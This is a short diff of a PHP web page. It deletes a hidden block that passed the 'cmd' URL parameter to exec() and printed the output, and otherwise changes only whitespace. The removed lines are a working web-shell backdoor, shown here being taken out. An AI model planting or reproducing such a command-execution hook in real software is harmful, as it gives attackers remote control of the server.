@@ -12,9 +12,7 @@
             // end
             
         }
-        if( isset($_GET['cmd'])){
-            echo(exec($_GET['cmd']));
-        }
+
     ?>
 
     <div align="right">
@@ -35,7 +33,7 @@
         <p><?=$Language["text"]?></p>
         <h2><?=$Language["header"] ?></h2>
     </div>
-    
+
     <!-- Created with <3 by 0x00ac -->
     </body>
 </html>
